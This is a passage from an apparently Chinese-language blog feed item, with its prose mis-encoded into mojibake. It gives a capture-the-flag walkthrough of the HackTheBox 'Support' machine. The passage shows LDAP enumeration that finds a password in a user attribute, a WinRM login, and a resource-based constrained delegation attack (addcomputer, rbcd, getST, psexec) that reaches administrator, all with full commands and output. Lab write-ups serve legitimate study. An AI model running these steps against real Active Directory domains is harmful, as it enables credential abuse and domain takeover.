WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 21 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SummerMachine.support.htb
INFO: Querying computer: Management.support.htb
INFO: Querying computer: dc.support.htb
WARNING: Could not resolve: SummerMachine.support.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.10.11.174@53 answered The DNS operation timed out.
INFO: Done in 00M 23S
INFO: Compressing output into 20250605003230_bloodhound.zip
```

æˆ‘ä»¬å½“å‰è·å¾—çš„ç”¨æˆ· `Ldap` çš„ä¿¡æ¯ï¼Œä»…ä»…åªæ˜¯åŸŸæˆå‘˜

![image.png](/post-images/HackTheBoxMachine%20-Support/image1.png)

æ‰€æœ‰çš„ç”¨æˆ·

![image.png](/post-images/HackTheBoxMachine%20-Support/image2.png)

æˆ‘ä»¬æŸ¥çœ‹è¿œç¨‹ç»„æœ‰å“ªäº›æˆå‘˜

![image.png](/post-images/HackTheBoxMachine%20-Support/image3.png)

`SUPPORT`ç”¨æˆ·ä¿¡æ¯

![image.png](/post-images/HackTheBoxMachine%20-Support/image4.png)

é‚£æˆ‘ä»¬å¤§æ¦‚æ˜¯è¦å…ˆè·å–åˆ°`SUPPORT` ç”¨æˆ·ï¼Ÿä½†æ˜¯ç°åœ¨æ²¡æœ‰åˆ«çš„ä¿¡æ¯äº†

### LDAP ä¿¡æ¯æ”¶é›†

æ‰€ä»¥æˆ‘ä»¬å…ˆä½¿ç”¨ `LADP` ç”¨æˆ·è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œæ‰¾ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯

æˆ‘ä»¬é¦–å…ˆæŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯

```bash
âœ  Support ldapsearch -x -H ldap://10.10.11.174:389 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=USERS,DC=SUPPORT,DC=HTB' -D 'CN=LDAP,CN=USERS,DC=SUPPORT,DC=HTB'
```

ä¿¡æ¯å¤ªå¤šäº†â€¦

æˆ‘ä»¬å°è¯•æŸ¥ä¸€ä¸‹`SUPPORT` ç”¨æˆ·çš„ä¿¡æ¯

```bash
âœ  Support ldapsearch -x -H ldap://10.10.11.174:389 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=SUPPORT,CN=USERS,DC=SUPPORT,DC=HTB' -D 'CN=LDAP,CN=USERS,DC=SUPPORT,DC=HTB'
# extended LDIF                                     
#                                  
# LDAPv3     
# base <CN=SUPPORT,CN=USERS,DC=SUPPORT,DC=HTB> with scope subtree
# filter: (objectclass=*)
# requesting: ALL                                                                                                 
#                                       
                                                         
# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support    
c: US      
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
**info: Ironside47pleasure40Watchful**
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
```

å…¶ä¸­çš„`info`å­—æ®µå¾ˆæœ‰è¶£ï¼Œå¯èƒ½å°±æ˜¯è¯¥ç”¨æˆ·çš„å‡­æ®

```bash
info: Ironside47pleasure40Watchful
```

æµ‹è¯•å‡­æ®ï¼Œå‡å¦‚è¯¥å‡­æ®æœ‰æ•ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¯¹`DC`è¿›è¡Œè¿œç¨‹äº†

```bash
âœ  Support nxc wmi 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful' -d support.htb
RPC         10.10.11.174    135    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
RPC         10.10.11.174    135    DC               [+] support.htb\support:Ironside47pleasure40Watchful
```

è¯¥å‡­æ®æœ‰æ•ˆ

```bash
âœ  Support evil-winrm -i 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> 
```

`Support`ç”¨æˆ·`Desktop`æ–‡ä»¶å¤¹å¯ä»¥å¾—åˆ° `user.txt`

```bash
*Evil-WinRM* PS C:\Users\support\Desktop> type user.txt
d52f8d3f19ac0230628b1805483c760c
```

## æƒé™æå‡

é¦–å…ˆä½¿ç”¨ `Winpeas` èµ°ä¸€æ³¢ï¼Œæ²¡æœ‰å¾ˆå¤šçš„æœ‰ç”¨çš„ä¿¡æ¯

`BloodHound`å†è¿›è¡Œåˆ†æï¼Œå‘ç°`Support`ç”¨æˆ·å¯¹`DC`æœ‰`GenericAll`æƒé™

![image.png](/post-images/HackTheBoxMachine%20-Support/image5.png)

### RBCD åŸºäºèµ„æºçº¦æŸå§”æ´¾

`Support`ç”¨æˆ·å¯¹`DC`æœ‰`GenericAll`æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥å®Œå…¨æ§åˆ¶`DC`

è¿™é‡Œå¯ä»¥æ‰“ `RBCD`

é¦–å…ˆåˆ›å»ºè®¡ç®—æœºè´¦æˆ·

```bash
âœ  Support addcomputer.py support.htb/support:'Ironside47pleasure40Watchful' -computer-name TEST\$ -computer-pass 123456 -dc-host support.htb -dc-ip 10.10.11.174
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account TEST$ with password 123456.
```

`RBCD` å§”æ´¾è®¾ç½®ï¼Œä»¥`support`çš„èº«ä»½ç™»å½•åˆ°`DC`ï¼Œä¿®æ”¹è®¡ç®—æœºè´¦æˆ·`DC$`çš„ä¸€ä¸ªå±æ€§`msDS-AllowedToActOnBehalfOfOtherIdentity` 

```bash
âœ  Support rbcd.py support.htb/support:'Ironside47pleasure40Watchful' -dc-ip 10.10.11.174 -action write -delegate-to DC\$ -delegate-from TEST\$ 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] TEST$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     TEST$        (S-1-5-21-1677581083-3380853377-188903654-5601)
```

æœ€ååˆ©ç”¨ `S4U` åè®®ä¼ªé€  `Administrator` ç”¨æˆ·ç”³è¯· `ST`

```bash
âœ  Support getST.py -spn cifs/DC.support.htb -impersonate administrator support.htb/TEST\$:'123456' -dc-ip 10.10.11.174
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
```

```bash
âœ  Support export KRB5CCNAME=Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache 
```

```bash
âœ  Support psexec.py support.htb/administrator@dc.support.htb -k -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file niOpACUP.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service oDhJ on dc.support.htb.....
[*] Starting service oDhJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

è¯»å– `root.txt`

```bash
C:\Users\Administrator\Desktop> type root.txt
89306b6f9ce190f011354f60b3342424
```]]></content:encoded>
            <category>é¶æœº</category>
            <category>HackTheBox</category>
            <category>Windows</category>
            <category>RBCD</category>
            <category>Reverse</category>
        </item>
    </channel>
</rss>